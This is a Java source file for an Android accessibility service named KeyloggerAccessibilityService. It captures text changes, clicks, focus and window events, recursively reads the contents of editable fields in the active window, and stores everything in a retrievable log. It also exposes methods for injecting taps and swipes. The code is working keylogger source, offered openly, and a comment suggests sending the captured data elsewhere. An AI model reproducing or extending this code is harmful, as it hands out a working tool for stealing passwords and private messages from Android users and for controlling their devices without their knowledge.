package com.anti.rootadbcontroller.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

/**
 * An accessibility service that acts as a keylogger, capturing user interactions
 * such as text input, view clicks, and focus changes. It also provides methods
 * for simulating user gestures like taps and swipes. This service requires the
 * accessibility permission to be granted by the user.
 */
public class KeyloggerAccessibilityService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private List<String> keylogData = new ArrayList<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = "";

        switch(eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "Text Changed: " + event.getText();
                break;

            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                eventText = "Focused: " + event.getClassName() + " - " + event.getText();
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                eventText = "Clicked: " + event.getClassName() + " - " + event.getText();
                break;

            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                eventText = "Selected: " + event.getClassName() + " - " + event.getText();
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                eventText = "Text Selection: " + event.getText();
                break;

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                eventText = "Window Changed: " + event.getClassName();
                break;
        }

        if (!eventText.isEmpty()) {
            Log.d(TAG, eventText);
            keylogData.add(eventText);
            // In a real application, you might want to save this data or send it somewhere
        }

        // Extract information from the accessibility node tree
        extractNodeInfo(getRootInActiveWindow());
    }

    private void extractNodeInfo(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) return;

        // Check if this node has editable text that might contain sensitive information
        if (nodeInfo.getText() != null && nodeInfo.isEditable()) {
            String capturedText = "Captured from " + nodeInfo.getClassName() + ": " + nodeInfo.getText();
            Log.d(TAG, capturedText);
            keylogData.add(capturedText);
        }

        // Recursively process child nodes
        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            AccessibilityNodeInfo childNode = nodeInfo.getChild(i);
            if (childNode != null) {
                extractNodeInfo(childNode);
                childNode.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Keylogger service connected");
    }

    /**
     * Simulates a tap gesture at the specified screen coordinates.
     * @param x The x-coordinate of the tap.
     * @param y The y-coordinate of the tap.
     */
    public void simulateTap(float x, float y) {
        Path tapPath = new Path();
        tapPath.moveTo(x, y);

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(tapPath, 0, 50));

        dispatchGesture(gestureBuilder.build(), null, null);
    }

    /**
     * Simulates a swipe gesture between two points on the screen.
     * @param x1 The starting x-coordinate of the swipe.
     * @param y1 The starting y-coordinate of the swipe.
     * @param x2 The ending x-coordinate of the swipe.
     * @param y2 The ending y-coordinate of the swipe.
     * @param duration The duration of the swipe in milliseconds.
     */
    public void simulateSwipe(float x1, float y1, float x2, float y2, long duration) {
        Path swipePath = new Path();
        swipePath.moveTo(x1, y1);
        swipePath.lineTo(x2, y2);

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, duration));

        dispatchGesture(gestureBuilder.build(), null, null);
    }

    /**
     * Retrieves the data collected by the keylogger.
     * @return A list of strings, where each string is a logged event.
     */
    public List<String> getKeylogData() {
        return new ArrayList<>(keylogData);
    }

    /**
     * Clears all the data collected by the keylogger.
     */
    public void clearKeylogData() {
        keylogData.clear();
    }
}
